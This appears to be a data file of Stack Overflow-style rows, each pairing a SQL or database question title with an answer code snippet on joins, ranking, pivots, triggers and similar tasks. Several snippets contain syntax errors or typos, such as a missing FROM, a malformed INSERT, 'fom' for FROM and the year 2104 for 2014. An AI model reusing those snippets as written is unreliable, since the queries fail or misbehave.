        extract(year from m.time) = 2014 and
        extract(month from m.time) = g.month
group by g.month
order by g.month
"
15741,68490,ranking in mysql dynamically,"SET @rownum := 0;

SELECT @rownum := @rownum+1 AS rank, name, marks
FROM your_table 
ORDER BY marks DESC
"
29902,21606,How can I get a list of the databases on a SQL Server Instance without Admin?,"select name from sys.databases
"
28582,30363,"Where is ""Status Update History"" in Database","Status History related information are available in MSP_ASSIGNMENT_TRANSACTIONS table however Status Flag can be check by comparing WPROJ_LAST_PUB and ASSN_TRANS_SUBMIT_DATE fields.
"
8258,58320,Set table collation and make it case insensitive,"CREATE DATABASE [asdf]
CONTAINMENT = NONE
ON  PRIMARY 
( NAME = N'asdf', FILENAME = N'D:\SQLData\asdf.mdf' , SIZE = 4096KB , FILEGROWTH = 1024KB )
LOG ON 
( NAME = N'asdf_log', FILENAME = N'D:\SQLData\asdf_log.ldf' , SIZE = 1024KB , FILEGROWTH = 10%)
COLLATE Latin1_General_CI_AS
GO
"
30702,37963,Combine and update table in sql,"select source , target , SUM(`count`), SUM(prob )
(select * from test
Union 
select * from test2) as t
group by source,target
"
27107,40982,SQL Query COUNT with two Joins,"SELECT m.id, 
       COUNT(DISTINCT c.id) AS t_comment, 
       COUNT(DISTINCT l.id) AS t_like
FROM messages m
LEFT JOIN user_comment_messages c ON c.message_id = m.id
LEFT JOIN user_like_messages l ON l.message_id = m.id
GROUP BY m.id;
"
5712,45475,Making a select for a two select sql/oracle,"SELECT table1.player_id, table1.score score1, table2.score score2,
       abs(table1.score - table2.score) difference
FROM (
       SELECT player_id, SUM(score) score
       FROM (
              SELECT player1_id player_id, score_p1 score FROM matchs
              UNION ALL
              SELECT player2_id , score_p2 FROM matchs
             ) q GROUP BY player_id
      ) table1
INNER JOIN 
          (
            SELECT player_id, SUM(score) score
            FROM (
                   SELECT player1_id player_id, score_p2 score FROM matchs
                   UNION ALL
                   SELECT player2_id , score_p1 FROM matchs
                  ) q GROUP BY player_id
          ) table2 ON table1.player_id = table2.player_id
"
35362,24559,MySQL select field from string,"SELECT `number`, `number2`, 
       SUBSTRING_INDEX(SUBSTRING_INDEX(`string`, ' ', 2), ' ', -1)
FROM   my_table
"
1002,7996,MySQL - ranking results based on parameters in the same query,"SELECT * 
FROM ARTICLES 
WHERE (group= substring_index('@search_string', '-', 1) + 0 
    AND article= substring_index('@search_string', '-', -1) + 0) 
OR description LIKE '%@search_string%'
ORDER BY CASE 
    WHEN (group= substring_index('@search_string', '-', 1) + 0 
        AND article= substring_index('@search_string', '-', -1) + 0) THEN 1
    WHEN description LIKE '%@search_string%' THEN 2 END ASC
"
23050,39259,How to extract list of values into rows from XML using XQuery?,"SELECT 
    node.value('.','varchar(100)') AS Val
FROM
    @x.nodes('/PartnerEmails/Email') AS PE(Node)    
"
25349,60936,SQL Statement That Will Get Table Schema And Created Date,"declare @SqlStatement varchar(max)
select @SqlStatement = COALESCE(@SqlStatement, '') + 'DROP TABLE [TMP].' + QUOTENAME(t.name) + ';' + CHAR(13)
from sys.tables t 
    join sys.schemas s on t.schema_id = s.schema_id 
where s.name = 'TMP'
    and t.create_date > dateadd(day,-1,getdate())
print @SqlStatement
"
3476,3069,Correct syntax for SQL UPDATE where value to be set is a SELECT,"UPDATE `rounds` SET drivingDistance_avg_per_hole = (
SELECT SUM(holes.drivingDistance)/COUNT(holes.drivingDistance) as avg 
FROM `holes`
WHERE holes.drivingDistance != '' 
AND holes.round = rounds.id )
"
26406,34113,Select records after 5 records in a table,"WITH tmp AS  
(SELECT ROW_NUMBER() OVER (ORDER BY a.id) AS 'rn', a.* FROM table a)
SELECT * FROM tmp WHERE rn BETWEEN 5 AND 10
"
28546,40163,MySQL query help: how to deal with data in most-recent-row-per-day from a big dataset,"select
    c.name as company,
    d.name as division,
    s.name as salesperson,
    sum(h.callsinbound) as callsinboundsum,
    sum(h.callsoutbound) as callsoutboundsum,
    sum(h.issuedorders) as issuedorderssum,
    sum(h.revenue) as revenuesum
from
    sales_history_performance h
    inner join
        (select
            th.salespersonid,
            date(th.timestamp) as my_date,
            max(th.timestamp) as max_time
        from
            sales_history_performance th
            inner join salesperson ts on
                th.salespersonid = ts.id
        where
            th.timestamp between '5/1/2009' and '5/3/2009' --inclusive in MySQL
        group by
            th.salespersonid,
            date(th.timestamp)
        ) t on
      h.salespersonid = t.salespersonid
      and h.timestamp = t.max_time
    inner join salesperson s on
        h.salespersonid = s.id
    inner join division d on
        s.divisionid = d.id
    inner join company c on
        d.companyid = c.id
group by
    c.name,
    d.name,
    s.name
order by 1,2,3
"
38686,47023,SQL Server SQL Select: How do I select rows where sum of a column is within a specified multiple?,"WHERE MyField % 4 = 0 OR MyField % 8 = 0
"
32376,18949,Combing values of a column on multiple rows.?,"DECLARE @a TABLE
(
   Animal VARCHAR(32), 
   Name   VARCHAR(32), 
   Toy    VARCHAR(32)
);

INSERT @a SELECT 'Cat','Kitty','Mouse';
INSERT @a SELECT 'Cat','Kitty','CatNip';
INSERT @a SELECT 'Dog','Rover','Bone';
INSERT @a SELECT 'Dog','Rover','Chew Toy';

SELECT DISTINCT Animal, Name, Toy = STUFF((SELECT ', ' + Toy
    FROM @a AS a2
    WHERE a2.Animal = a.Animal AND a2.Name = a.Name
    FOR XML PATH(''), TYPE).value('.[1]', 'nvarchar(max)'),
    1,2,'')
FROM @a AS a;
"
14441,61895,Where clause affects Count() but not number of results returned,"   SELECT [user_id], [first_name], COUNT(m.sender_id) as number_of_messages
     FROM [Member]
LEFT JOIN [Message] m ON user_id = m.sender_id
                     AND m.message_type = 0
 GROUP BY [Member].[user_id], [first_name]
 ORDER BY number_of_messages DESC
"
39904,42561,Order rows within groups in PostgreSQL,"SELECT 
  routeid, 
  'SRID=4326;LINESTRING(' || string_agg(lon || ' ' || lat, ',' ORDER BY time ASC) || ')' AS the_geom
FROM route_table 
WHERE observation_time BETWEEN '2012-09-12 10:00:00' AND '2012-09-12 10:15:00'
GROUP BY routeid HAVING COUNT(lon) > 1;
"
31413,52000,Null value column and NOT EXISTS T-sql,"    SELECT  *   
                FROM    [tbl_web_company] 
                WHERE   [name]          = @name
                AND     [address1]      = @address1
                AND     [address2]      = @address2
                AND     [city]          = @city
                AND     ISNULL([province_id],99999) = ISNULL(@province_id,99999)
                AND     [postal_code]   = @postalcode
                AND     [contact_phone] = @phone
                AND     [contact_fax]   = @fax
                AND     ISNULL([deleted], '1990-01-01') = ISNULL(dbo.pvd_fn_getDeletedDate(@id, @active), '1990-01-01')
    BEGIN
        SELECT 'update'
    END
    ELSE
    BEGIN
        SELECT 'no update'
    END
"
24142,50757,oracle trigger select updated row,"CREATE OR REPLACE TRIGGER Z_ONUPDATELOGIN
  AFTER UPDATE OF LAST_LOGGED_IN_DATE ON CMN_SEC_USERS
  FOR EACH ROW
BEGIN
    INSERT INTO Z_LOGIN (name, login_date) 
    VALUES (:NEW.first_name || :NEW.last_name, 
            :NEW.last_logged_in_date);  
END;
"
20729,30880,Sql Query help needed for product relation,"SELECT s.ID, s.ProductId, s.Name, 
  OtherData = COALESCE(s.OtherData, r.OtherData)
FROM dbo.Products AS s
LEFT OUTER JOIN dbo.Products AS r
ON s.ProductId = r.ID;
"
20236,40092,SQL - order by list order,"declare @T table (RecordID int,Position int)
insert into @T (RecordID,Position)
select 22,1 union all
select 15,2 union all
select 105,3 union all
select 1,4 union all
select 65,5 union all
select 32,6

select * from Table t inner join @T t2 on t.RecordID = t2.RecordID order by t2.Position
"
11923,13395,SQL Group By Before Averaging,"SELECT t.Opp, avg(Points)
FROM (SELECT gl.team, gl.Opp, AVG(gl.Points) as Points
      FROM Players p INNER JOIN
           NBAGameLog gl
           ON p.Player_ID = gl.Player_ID
      WHERE (gl.Date_Played Between Date()-15 And Date() AND
            p.Position = ""C""
     GROUP BY gl.team, gl.Opp;
    ) t
GROUP BY t.Opp;
"
16084,61586,When would you use a column name instead of * in a count?,"ID   |  NAME
 1      John
 2      NULL
 3      Jonathan

SELECT COUNT(*) FROM Table -- return 3

SELECT COUNT(NAME) FROM Table -- return 2
"
31644,12877,SQL: Find max tuple,"SELECT val
FROM test
ORDER BY year DESC, month DESC
LIMIT 1;
"
3772,67718,CONVERT various date-like strings (varchar) to one DATE field,"WITH x(ShipDate) AS
(
    SELECT '5/12/2011'
    UNION ALL SELECT '05/5/2012'
    UNION ALL SELECT '05/05/2012'
)
SELECT CONVERT (DATE, ShipDate) FROM x;
"
14792,21456,Denormalizing and querying a giant Couchbase data set,"function(doc) {
  if (doc.type == 'user')
    emit(doc.email_host, doc);
}
"
12745,51334,SQL - Inserting a row and returning primary key,"SELECT SCOPE_IDENTITY() AS NewID
"
11576,3780,Change all primary keys in access table to new numbers,"INSERT 
    TestID, Date, Data
INTO
    NewTable
SELECT
    TestID, Date, Data
FROM
    OldTable;
"
36958,2635,SQL Triggers - Deleted or Updated? or maybe something else?,"INSERT INTO
  tblHistoryTable
SELECT
  deleted.*
FROM
  inserted
INNER JOIN
  deleted
    ON inserted.PrimaryKey = deleted.PrimaryKey
WHERE
  inserted.StatusCode <> deleted.StatusCode
  AND (inserted.StatusCode = 'P' OR inserted.StatusCode = 'A')
"
32355,19843,Query to find links that don't exist between 2 tables/queries,"select a.*
from (
  select user_id, alert_id
  from users
  join alerts) a
left join user_alerts b on a.user_id = b.user_id and a.alert_id = b.alert_id
where b.user_id is null;
"
12643,60216,Sql server order by value not by field name,"declare @filter table (id int identity, ref varchar(50))
insert @filter values ('00000634B9')
insert @filter values ('0001414825')
insert @filter values ('00000634B6')

select  *
from    YourTable yt
join    @filter filter
on      filter.ref = yt.OEReference
order by
        filter.id
"
21441,26869,How to compare two tables column by column in oracle,"select *
from 
(
( select * from TableInSchema1
  minus 
  select * from TableInSchema2)
union all
( select * from TableInSchema2
  minus
  select * from TableInSchema1)
)
"
32132,18494,"Mongodb - Difference between running ""mongo"" and ""mongod"" databases","./mongo localhost:27017/dbname
"
2289,28492,Generic SQL Query with group by,"SELECT veh.VEHICLE_CLASS_ID, 
       vehclass.VEHICLE_CLASS_NAME, 
       Sum(CASE 
             WHEN veh.STATUS = 2 THEN 1 
           END) Completed, 
       Sum(CASE 
             WHEN veh.STATUS <> 2 THEN 1 
           END) not_completed 
FROM   VEHICLE veh 
       LEFT JOIN VEHICLE_CLASS vehclass 
         ON veh.VEHICLE_CLASS_ID = vehclass.VEHICLE_CLASS_ID 
GROUP  BY veh.VEHICLE_CLASS_ID, 
          vehclass.VEHICLE_CLASS_NAME 
HAVING veh.VEHICLE_CLASS_ID IS NOT NULL; 
"
18248,3126,How can I shorten this SQL?,"
update opp set run_mode = 0, run_time = 0, 
where (oppar_job_name = oppar_job_rec) and 
      (oppar_job_rec in ('ABC','DEF','FGH','IJK'));
"
14834,17640,Oracle SQL - Column has no Corresponding Table,"   select table_name from all_tab_columns
   where column_name = 'COLUMN NAME'; 
"
28311,19256,Need to convert Text field to Varchar temporarily so that I can pass to a stored procedure,"declare @v varchar(8000)
SET @v = (SELECT CAST(textcol as varchar(8000)) FROM yourtable WHERE ....)
"
1158,888,How to select one's name day from first name and birth date?,"WITH    users AS
        (
        SELECT  1 AS id, 'Bob' AS first_name, CAST('1975-08-05' AS DATETIME) AS birth_date
        UNION ALL
        SELECT  2 AS id, 'Frank' AS first_name, CAST('1987-01-01' AS DATETIME) AS birth_date
        ),
        namedays AS
        (
        SELECT  'Bob' AS name, CAST('1900-04-22' AS DATETIME) AS date
        UNION ALL
        SELECT  'Bob' AS name, CAST('1900-09-04' AS DATETIME) AS date
        UNION ALL
        SELECT  'Frank' AS name, CAST('1900-01-02' AS DATETIME) AS date
        )
SELECT  *
FROM    users u
OUTER APPLY
        (
        SELECT  COALESCE(
                (
                SELECT  TOP 1 date
                FROM    namedays nd
                WHERE   nd.name = u.first_name
                        AND nd.date >= DATEADD(year, 1900 - YEAR(u.birth_date), birth_date)
                ORDER BY
                        nd.date
                ),
                (
                SELECT  TOP 1 date
                FROM    namedays nd
                WHERE   nd.name = u.first_name
                ORDER BY
                        nd.date
                )
                ) AS date
        ) dates
"
35465,47533,Retrieve data from another table / subquery,"SELECT 
    pa.BUSINESS_UNIT, 
    pa.DESCR,
    pdr.DEPTID, 
    pdr.ASSET_ID, 
    pdr.ACCOUNT_AD, 
    pdr.BOOK,

    MAX(CASE WHEN (pdr.FISCAL_YEAR =2014 AND pdr.ACCOUNTING_PERIOD =11) THEN  pdr.DEPR END) as CURRENT_AMT,
    MAX(CASE WHEN (pdr.FISCAL_YEAR =2104 AND pdr.ACCOUNTING_PERIOD =10) THEN pdr.DEPR  END) as PRIOR_AMT,

    pdl.journal_id,
    pdl.journal_date

FROM PS_ASSET pa

INNER JOIN PS_DEPR_RPT pdr 
    ON pa.ASSET_ID = pdr.ASSET_ID
    AND pa.BUSINESS_UNIT = pdr.BUSINESS_UNIT

LEFT JOIN ps_dist_ln pdl
    ON pdl.ASSET_ID = pdr.ASSET_ID
    AND pdl.book = pdr.book
    AND pdl.fiscal_year = pdr.fiscal_year
    AND pdl.accounting_period = pdr.accounting_period

WHERE 
    pa.BUSINESS_UNIT=A0465
    AND pdr.BOOK='PERFORM'
    AND ((pdr.FISCAL_YEAR=2014 AND pdr.ACCOUNTING_PERIOD=11) 
        OR (pdr.FISCAL_YEAR=2014 AND pdr.ACCOUNTING_PERIOD=10))
    and pdl.business_unit = 'A0465'
    and pdl.distribution_type = 'DE'

group by
    pa.business_unit,
    pa.descr,
    pdr.deptid,
    pdr.asset_id,
    pdr.account_ad,
    pdr.book

order by
    pdr.asset_id
"
35974,47087,How to Perform the following query using Greendao ?,"Query query = ATableDao.queryBuilder().where(
new StringCondition(""nameid IN "" +
""(SELECT nameid FROM B_Table )"").build();
"
20500,14732,What's the most efficient way to check if a record exists in Oracle?,"select case 
            when exists (select 1 
                         from sales 
                         where sales_type = 'Accessories') 
            then 'Y' 
            else 'N' 
        end as rec_exists
from dual;
"
23807,42952,MySql safe transfer of value from one row to another,"UPDATE
  Balance
RIGHT JOIN
  (SELECT id FROM (SELECT :srcId AS id UNION ALL SELECT :dstId AS id) as v WHERE EXISTS(SELECT id FROM Balance WHERE id = :srcId AND balance >= :value)) AS ids ON Balance.id = ids.id
SET
  balance = balance + IF(ids.id = :srcId, -:value, :value)
"
3043,46771,Teradata Rank Over Query (Getting one row to left join),"SELECT * FROM
    (SELECT ID as V_ID from IDS) a
    LEFT JOIN
    (SELECT ID, NAME, COUNT(*) AS COUNTER
    FROM NAMES
    GROUP BY ID
    qualify ROW_NUMBER() OVER(PARTITION BY ID ORDER BY COUNTER DESC) = 1
    )b
    ON a.ID = b.ID
    LEFT JOIN
    (SELECT ID, ADDRESS, COUNT(*) AS COUNTER
    FROM ADDRESSES
    GROUP BY ID
    qualify ROW_NUMBER() OVER(PARTITION BY ID ORDER BY COUNTER DESC) = 1
    ) c
    ON c.ID = a.ID
"
33779,74055,Adding averages to a table,"select distinct
  location, unit, 
  cast(count(*) over (partition by unit, location) as decimal) / 
  cast(count(*) over (partition by unit) as decimal) as weight
from mytable
order by unit, location;
"
22675,8575,ORA-00933 before update query,"CREATE TABLE PATIENT_ACCOUNT
(
    ID         NUMBER
,   PATIENT_ID NUMBER
,   ACCOUNT_ID NUMBER
);

INSERT INTO PATIENT_ACCOUNT VALUES(1, 11, 22);

UPDATE  PATIENT_ACCOUNT
SET     PATIENT_ID = 1
AND     ACCOUNT_ID = 2
WHERE   ID = 3;
-- ORA-00933: SQL command not properly ended

UPDATE  PATIENT_ACCOUNT
SET     PATIENT_ID = 33
,       ACCOUNT_ID = 44
WHERE   ID = 1;
-- 1 rows updated.
"
29147,62636,Mixing two records in Oracle,"select id, date, max(userid1) as userid1, max(userid2) as userid2
from table t
group by id, date;
"
37266,43453,SQL Query help - using max() twice on same column,"SELECT MAX(CASE WHEN event = 'Event1' THEN date END) Event1, 
    MAX(CASE WHEN event = 'Event2' THEN date END) Event2
FROM yourTable
"
9778,13770,Can this SQL constraint be written more simply?," create table game_players (
      game_id number, player_id number, player_position number
    );
"
16755,34698,SQL Server Replace Censored Words In a Select From Replace Table,"-- first generate the replace statement with all Black_Words
declare @replace varchar(max)
select @replace = coalesce ('replace(' + @replace,'replace(bericht') + ',''' + Black_Word + ''',''' + Replace_Word + ''')'
FROM Word_Blacklist

-- execute statement
exec( 'select ' + @replace + 'from ESCodes')
"
855,23734,How do I replace an entire column in MySQL?,"update table1 t
join ( select firstname, residence, @rw := @rw + 1 as row_number
  from table1
 cross join (SELECT @rw := 0) r ) x on t.firstname = x.firstname
join ( select residence, @rx := @rx + 1 as row_number
  from table2
 cross join (SELECT @rx := 0) r ) y on y.row_number = x.row_number
set t.residence = y.residence
"
8428,42085,Nested query - looking for better solution,"SELECT day, sales_person, sum(num_transactions) from
(
    SELECT day, sales_person, number_of_transactions As num_transactions FROM sales;
    UNION ALL 
    SELECT day, sales_person_from, number_of_transactions FROM internal_sales;
)
GROUP BY day, sales_person;
"
648,5547,SQL: Using CASE and returning only max value,"select
    T1.[Closing Date], T2.[Price Date],
    case
        when T1.[Closing Date] = T2.[Price Date] then 'MATCH'
        else 'NONMATCH'
    end as [Match]
from Table1 as T1
    outer apply (
        select top 1 T2.[Price Date]
        from Table2 as T2
        where
            T2.[Price Date] <= T1.[Closing Date] and
            T2.[Price Date] >= dateadd(day, -5, T1.[Closing Date])
            -- you can use between, I just like >= <= syntax more
            -- T2.[Price Date] between T1.[Closing Date] and dateadd(day, -5, T1.[Closing Date])
        order by T2.[Price Date] desc
    ) as T2
"
39352,60364,why these is a question mark at the end of string," 'www.myweb.com?q=id%3D'+convert(varchar(20),@id) +'%26action%3go​'
"
33717,50609,Mysql Many to Many Query,"SELECT g.*, ht.name, ht.tid, at.name, at.tid, ht.league
FROM games g
JOIN team_games htg ON htg.gid = g.gid AND htg.homeoraway = 1
JOIN team ht ON ht.tid = htg.tid
JOIN team_games atg ON atg.gid = g.gid AND atg.homeoraway = 0
JOIN team at ON at.tid = atg.tid
"
33825,47081,sql statement to delete records older than XXX as long as there are more than YY rows,"delete
from
  MyTable
where
  item_id in
  (
    select
      item_id
    from
      MyTable
    group by
      item_id
    having
      count(item_id) > 15
  )
  and
    Date < @tDate
"
2539,75467,Flattening SQL server INNER JOIN result,";with cte as
(
  select
    kf,
    (select data+','
     from #b as b2
     where b1.kf = b2.kf
     for xml path('')) as data
  from #b b1 
  group by kf
)
select
  a.kf, 
  left(b.data, len(b.data)-1) as data
from #a as a
  inner join cte as b
    on a.kf = b.kf
"
6302,55040,Find all possible event_id that were attend by tag_id 5 and 21,"select * from 
table
where tag_id IN (21,5)
group by event_id
having count(distinct tag_id) = 2
"
36266,69318,How to fetch a row which is related to multiple rows in another table?,"SELECT * FROM (
  SELECT p.product_id, p.product_title,
    u.updated_admin latest_admin_id, u.updated_date latest_date
  FROM ws_shop_product p
  LEFT JOIN `ws_shop_product-updated` u ON u.updated_product = p.product_id
  ORDER BY u.updated_date DESC) x
GROUP BY 1
"
17327,14952,how to write this oracle query in jpa?,"Select q fom QuestionInfo q where q.name in (Select r.name from ResponseInfo q2 where r.isConflict = 'yes')
"
14418,70446,Jeopardy questions in Excel or other database format?,"// Pseudocode for compiling a list of Jeopardy questions/answers
questions = array();
answers = array();
for (i = first_game_id; i <= last_game_id; i++) {
  if (gameIdExistsOnSite(i)) {
    html = retrievePageHTMLForGameId(i);
    divs = getQuestionDivsFromHTML(html);
    foreach (divs as div) {
      questions[] = getQuestionFromDiv(div);
      answers[] = getAnswerFromDiv(div);
    }
  }
}

csv = convertToCSV(questions, answers);
"
30637,29396,Django ORM - percent sign for like,"YourModel.objects.extra(where=['title LIKE %s'], params=['%123%321%'])
"
8189,9850,Select another attribute if the original attribute is NULL (Conditional select),"select coalesce(val1, val2) from test_table
"
199,61040,Sum the different date total,"SELECT
    CAST(DATEADD(hour, -5, TRAN_DATE) AS DATE) AS sDate,
    SUM(Amount)
FROM TRAN_TABLE
GROUP BY CAST(DATEADD(hour, -5, TRAN_DATE) AS DATE)
"
29727,42534,Can I make one select statement in SQL?,"SELECT 'Month Total' AS Label, Count(*) AS Value
FROM CRMProjects
WHERE CreatedDate between '01 May 2016' and '31 May 2016'

UNION ALL

SELECT 'Year Total' AS Label, Count(*) AS Value
FROM CRMProjects
WHERE CreatedDate between '01 Jan 2016' and '31 Dec 2016'

UNION ALL

SELECT 'Month New' AS Label, Count(*) AS Value
FROM CRMProjects
WHERE CreatedDate between '01 May 2016' and '31 May 2016'
AND SystemType = 'O'

UNION ALL

SELECT 'Year Closed' AS Label, Count(*) AS Value
FROM CRMProjects
WHERE CreatedDate between '01 Jan 2016' and '31 Dec 2016'
AND SystemType = 'C'
"
22625,13175,How to get all the month last date in the fiscal year using sql,"DECLARE @Month int =5
DECLARE @Year int = 2004
declare @i int = 0
if @Month between 1 and 5  set @i = 1 else set @i = 0
create table #temp(Monthend datetime)

set @Month = 6
while(@month<=12)
begin
insert into #temp
select DATEADD(day,-1,DATEADD(month,@Month,DATEADD(year,@Year-@i-1900,0)))  
set @month = @month+1
end

set @Month = 1
while(@month<6)
begin
insert into #temp
select DATEADD(day,-1,DATEADD(month,@Month,DATEADD(year,@Year-@i-1899,0)))  
set @month = @month+1
end

Select * from #temp
Drop table #temp
"
31381,53467,SQL to calculate % with SELECT and GROUP BY in the denominator,"SELECT system, color_code, Count(color_code) AS ColorCount, Count(color_code)*100 /(select count(*) from Detail where system = D.system) AS ColorPercent
FROM Detail D
GROUP BY system, color_code;
"
8283,36331,How to list all ratings received by user,"SELECT u.usuario, u.id_usuario, d.id, v.valoracion, v.fecha
FROM icar_valoraciones v
JOIN icar_dibujos d ON v.id_dibujo = d.id
JOIN icar_usuarios u ON v.id_quien = u.id_usuario WHERE d.id_quien = '{ID OF THE USER LOGGED IN}' GROUP BY v.id ORDER BY v.fecha DESC
"
31626,13128,greater than in case when in sql,"select case when (TIMESTAMPDIFF(SECOND,last_active,now())) > 100 then 'True' else 'False' end 
from sessions where uuid=11 and token='test';
"
32824,28807,SQL: Find a value based on effective date,"select e.*,
       (select top 1 eh.Role
        from EmployeeHistory eh
        where e.EmployeeId = eh.EmployeeId and
              e.date >= eh.EffectiveDate
        order by eh.EffectiveDate desc
       ) as Role
from Event e;
"
8022,64251,SQL replacing a field with specific text,"select 'longest time' AS status, name, longname, max(starting) from one
union
select 'shortest time' AS status, name, longname, min(starting) from one; 
"
29107,64927,detect gaps in integer sequence,"SELECT 
CASE WHEN ((MAX(x)-MIN(x)+1 = COUNT(DISTINCT X)) OR 
           (COUNT(DISTINCT X) = 0)  )
           THEN 'TRUE'
           ELSE 'FALSE'
END   
FROM foo 
"
35212,63294,Oracle - Select the latest distinct record from table,"select *
from
(
    select 
        id,
        heading,
        date,
        row_number() over ( partition by id order by heading desc nulls last ) r
    from table1
)
where r = 1
"
23796,25238,changing rows group to column,"create table #test(
ProductId int,
dt date,
customercode int,
someindex varchar(255),
SomeIndexvalue int
)

insert into #test values
(13,'2011-10-01',1,'A1',9397062),
(14,'2011-10-01',2,'A1',3575045),
(15,'2011-10-01',3,'A1',3575321),
(13,'2011-10-01',1,'A2',1318774),
(14,'2011-10-01',2,'A2',838924),
(15,'2011-10-01',3,'A2',8942430)


select * from 
(
   select 
      * 
   from  
      #test
)DATA_TO_PIVOT
PIVOT
(
MAX(SomeIndexvalue) for someindex in ([A1],[A2])
)PIVOTED_DATA      
"
27203,74112,How to update table with only new or changed values?,"INSERT INTO [FRIIB].[dbo].[ArchiveAnalog] (Date, ID, Value)
SELECT  laa.Date, laa.ID, laa.Value
FROM    [LinkedOne].[FRIIB].[dbo].[ArchiveAnalog] laa
        LEFT OUTER JOIN [FRIIB].[dbo].[ArchiveAnalog] aa ON aa.Date = laa.Date
                                                            AND aa.ID = laa.ID
                                                            AND aa.Value = laa.Value
WHERE   aa.ID IS NULL                                                            
"
39023,53531,How to get the id of the lastest object i have just added to the database?,"public long insertAuto(Student student){
    SQLiteDatabase db = dbOpen.getWritableDatabase();

    ContentValues vals = new ContentValues();
    vals.put(Constants.STUDENT_NAME, student.getName());
    vals.put(Constants.STUDENT_INFO, movie.getInfo());

    long id = db.insert(Constants.TABLE_NAME_STUDENTS, null, vals);

    db.close();

    return  id;
}
"
12488,61156,Need a query to conditionally display column,"select 
   case when Date01='someDate' 
        then Date 
        else null end as Date01
from TableName
where yourFilters
  or Date01='someDate'
"
26841,19345,Create trigger to automatically insert row in other table first,"CREATE PROCEDURE uspInsertVoyage
(
    @voyageID INT, 
    @destinationString NVARCHAR(50)
)
AS
BEGIN

    DECLARE @destinationID INT;

    IF NOT EXISTS (SELECT * FROM Countries WHERE countryName = @destinationString)
    BEGIN
        INSERT INTO countries (countryName) VALUES (@destinationString)
    END;

    SELECT @destinationID = countryID FROM Countries WHERE countryName = @destinationString;

    INSERT INTO voyages (voyageID, destinationID, destinationString) VALUES (@voyageID, @destinationID, NULL);

END
"
33321,70187,pass results of one query into another in SQL,"SELECT p.id, p.name, g.name, g.id
FROM person p INNER JOIN position pos on p.id = pos.person_fk
INNER JOIN role_details rd on rd.id = pos.role_details_fk
INNER JOIN group_role gr on gr.id = rd.group_role_fk
INNER JOIN ""group"" g on g.id = gr.group_fk
WHERE g.id = (SELECT g.id FROM ""group"" g INNER JOIN group_role gr on g.id = gr.group_fk
INNER JOIN role_details rd on rd.group_role_fk = gr.id
INNER JOIN mandate m on m.role_details_fk = rd.id where m.id = x)
"
34629,68647,Create new table with data from Wordpress wp_postmeta table,"select post_id, 
       max(case when meta_key = 'Name' then meta_value end) as Name,
       max(case when meta_key = 'Issuer' then meta_value end) as Issuer,
       max(case when meta_key = 'Issuer_Subtype' then meta_value end) as Subtype
FROM wp_postmeta
group by post_id 
"
6693,55202,Choose different column on SELECT if one is empty,"
select coalesce(update_date,pub_date),update_date,pub_date
from yourtable 
"
1571,54980,Is database refactoring impossible in Entity Framework 5 Migrations?,"UPDATE [dbo].[A] SET [BName] = [B].[BName]
FROM [dbo].[A]
FULL OUTER JOIN [dbo].[B] ON [A].[BId] = [B].[Id]
"
1843,48046,How do I fix the substring to use like in SQL code?,"SELECT  description
FROM    tr_status
WHERE   description LIKE '%' + @status + '%'
"
32745,14991,"sql join relationship - if an entry is found, then don't select","SELECT users.*, roles.roleName
FROM users
INNER JOIN roles_users on users.userid = roles_users.userid
INNER JOIN roles ON roles_users.roleID = roles.roleID
WHERE NOT EXISTS(SELECT roles_users.userID FROM roles_users
      WHERE roles_users.userID = users.userid AND roleName = 'super admin')
"
19184,48492,how convert column to row and get its row_number in postgresql,"select row_number() over() row_num,col_val from (
select unnest((
 select array[c1,c2,c3,c4] from (
select 55  c1,5 c2 ,8 c3,3 c4 )s 
)) as col_val) b
"
11267,34409,Insert Data From One Table to Another Table with default values,"Insert into table1(col1,col2,col3,col4,col5)
select col1,col2,col3,1,2 from table2
"
39541,31776,How to update only a certain percent of matching values,"update table
set status_id = new_status_id
where
    status_id = old_status_id
    and random() < 0.5
"
31989,65841,SQL - Select same values in column then rename them,"update t join
       (select name, count(*) as cnt, min(id) as minid
        from t
        group by name
        having cnt > 1
       ) tt
       on t.name = tt.name and t.id <> tt.minid
    set name = concat(name, '-copy');
"
21502,67677,Get list of tables but not include system tables (SQL Server 2K)?,"select name from sysobjects where type='U'
"
5205,23776,Better way to select nearest records in Postgresql,"(select name from toode where name > 'Cheese' order by name limit 20)
union all
(select name from toode where name < 'Cheese' order by name desc limit 20)
"
19557,65792,Using a column in sql join without adding it to group by clause,"SELECT to_char(date_trunc('month', i.create_datetime), 'MM/YYYY') AS month
     , count(*)                                   AS total_invoice_count
     , (sum(i.total) - COALESCE(sum(pi.paid), 0)) AS outstanding_balance
FROM   invoice i
LEFT   JOIN  (
    SELECT invoice_id AS id, sum(amount) AS paid
    FROM   payment_invoice pi
    GROUP  BY 1
    ) pi USING (id)
GROUP  BY date_trunc('month', i.create_datetime)
ORDER  BY date_trunc('month', i.create_datetime);
"
12430,29782,SQL Server compare values of two rows of same table and get not matching column names,"SELECT
-- For each column you're checking.  Also account for ISNull if you need to
CASE WHEN I.Col1 = D.Col1 THEN 0 ELSE 1 END AS Col1Changed.......
FROM INSERTED I
INNER JOIN DELETED D on (I.<PK> = D.<PK>)
"
3417,34687,How to select using criteria? SQL syntax,"Select Table1.*
from Table1
where (X = 0 or Width = X) and
      (Y = 0 or Height = Y) and
      (Z = 0 or Length = Z)
"
14506,13201,How to add checkbox column into grid view using Windows form VB.net,"Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
    mycom.Connection = cn
    mycom.CommandText =
        <SQL>
            SELECT
                Idno
                ,Name
                ,Course
                ,YearSec
                ,Organization
            FROM tbl_students
        </SQL>.Value

    If cn.State = ConnectionState.Closed Then
        cn.Open()
    End If

    Dim myadap As New SqlDataAdapter(mycom)
    Dim mydt As New DataTable
    myadap.Fill(mydt)

    mydt.Columns.Add(""CheckBoxColumn"", GetType(Boolean))
    grdRecipients.DataSource = mydt

    myadap.Dispose()
End Sub
"
37240,72598,Oracle 10g - Determine the date a Trigger was last updated,"select object_name, object_type, created, timestamp
from user_objects
where object_name = 'nameOfYourTrigger'
"
5118,70064,DATEDIFF() or BETWEEN for Date Ranges in SQL Queries,"where
  SIH.[Something_Date] >= '19700101' and
  SIH.[Something_Date] < '20130102'
"
6958,58170,Is it possible to find all primary keys that have system generated names in a database?,"SELECT * 
FROM sys.key_constraints
WHERE type = 'PK'
  AND is_system_named = 1
"
8750,25669,How to check for null/empty/whitespace values with a single test?,"SELECT column_name
  FROM table_name
 WHERE TRIM(column_name) IS NULL
"
7838,26994,Can/how do you add a circle of references without breaking RI?,"BEGIN;
  SET CONSTRAINTS ALL DEFERRED;
